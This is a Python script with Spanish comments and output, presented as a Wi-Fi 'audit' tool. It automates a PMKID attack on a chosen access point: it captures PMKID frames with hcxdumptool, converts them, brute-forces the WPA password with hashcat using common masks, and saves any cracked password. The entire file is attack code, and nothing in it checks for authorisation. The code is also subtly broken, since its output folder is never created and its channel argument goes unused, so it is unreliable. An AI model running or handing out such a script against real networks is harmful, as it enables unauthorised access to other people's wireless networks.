#!/usr/bin/env python3
"""
auto_wifi_audit.py - Script de automatización
SEPARADO del archivo principal
"""

import subprocess
import sys
import json
from datetime import datetime

def run_command(cmd):
    """Ejecutar comando y capturar salida"""
    print(f"[*] Ejecutando: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout, result.stderr

def auto_pmkid_attack(bssid, channel, interface="wlan0mon"):
    """Auditoría automática PMKID"""
    print(f"\n{'='*60}")
    print(f"AUDITORÍA AUTOMÁTICA - {bssid}")
    print(f"{'='*60}")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = f"results/audit_{timestamp}"
    
    # 1. Capturar PMKID
    print("\n[FASE 1] Capturando PMKID...")
    hcx_cmd = [
        "hcxdumptool", "-i", interface,
        "-o", f"{output_dir}/pmkid_capture.pcapng",
        "--enable_status=1",
        "--filterlist_ap", f"{output_dir}/target.txt",
        "--filtermode=2"
    ]
    
    # Crear archivo target
    with open(f"{output_dir}/target.txt", "w") as f:
        f.write(bssid)
    
    # Ejecutar captura (30 segundos)
    import threading
    import time
    
    def run_hcx():
        subprocess.run(hcx_cmd, timeout=30)
    
    hcx_thread = threading.Thread(target=run_hcx)
    hcx_thread.start()
    time.sleep(30)
    
    # 2. Convertir a hash
    print("\n[FASE 2] Convirtiendo hash...")
    convert_cmd = [
        "hcxpcaptool", "-z", f"{output_dir}/hash.hc22000",
        f"{output_dir}/pmkid_capture.pcapng"
    ]
    run_command(convert_cmd)
    
    # 3. Ataque con máscaras comunes
    print("\n[FASE 3] Ataque con máscaras...")
    
    masks = [
        "?d?d?d?d?d?d?d?d",          # 8 dígitos
        "?d?d?d?d?d?d?d?d?d?d",      # 10 dígitos
        "?l?l?l?l?d?d?d?d",          # 4 letras + 4 números
        "wifi?d?d?d?d",              # wifi + 4 dígitos
        "?u?l?l?l?l?d?d?d",          # 1 mayúscula + 3 min + 3 números
    ]
    
    for mask in masks:
        print(f"\n[*] Probando máscara: {mask}")
        hashcat_cmd = [
            "hashcat", "-m", "22000",
            f"{output_dir}/hash.hc22000",
            "-a", "3", mask,
            "--force", "-O", "-w", "3"
        ]
        
        stdout, stderr = run_command(hashcat_cmd)
        
        if "Cracked" in stdout:
            # Extraer password
            for line in stdout.split('\n'):
                if ":" in line and len(line.split(':')) > 2:
                    password = line.split(':')[2]
                    print(f"\n[+] CONTRASEÑA ENCONTRADA: {password}")
                    
                    # Guardar resultado
                    with open(f"{output_dir}/RESULTADO.txt", "w") as f:
                        f.write(f"BSSID: {bssid}\n")
                        f.write(f"Contraseña: {password}\n")
                        f.write(f"Máscara: {mask}\n")
                        f.write(f"Fecha: {datetime.now()}\n")
                    
                    return password
    
    print("\n[-] No se encontró contraseña con máscaras comunes")
    return None

def main():
    """Función principal del script de automatización"""
    print("="*60)
    print("AUTO_WIFI_AUDIT.PY - Script de Automatización")
    print("="*60)
    
    # Verificar que estamos en el directorio correcto
    import os
    if not os.path.exists("wifi_auditor.py"):
        print("[!] Error: Este script debe estar en la misma carpeta que wifi_auditor.py")
        print("[*] Estructura esperada:")
        print("    /carpeta/")
        print("    ├── wifi_auditor.py    (script principal)")
        print("    └── auto_wifi_audit.py (este script)")
        sys.exit(1)
    
    # Crear directorios necesarios
    os.makedirs("results", exist_ok=True)
    os.makedirs("logs", exist_ok=True)
    
    # Parámetros (puedes modificar estos valores)
    target_bssid = input("Ingrese BSSID objetivo (ej: 00:11:22:33:44:55): ").strip()
    target_channel = input("Ingrese canal (ej: 6): ").strip()
    
    if not target_bssid or not target_channel:
        print("[!] Se necesitan BSSID y canal")
        sys.exit(1)
    
    # Ejecutar auditoría automática
    password = auto_pmkid_attack(target_bssid, target_channel)
    
    if password:
        print(f"\n{'='*60}")
        print(f"¡AUDITORÍA COMPLETADA!")
        print(f"Password encontrado: {password}")
        print(f"{'='*60}")
    else:
        print("\n[-] La auditoría automática no encontró la contraseña")
        print("[*] Intenta métodos manuales con wifi_auditor.py")

if __name__ == "__main__":
    main()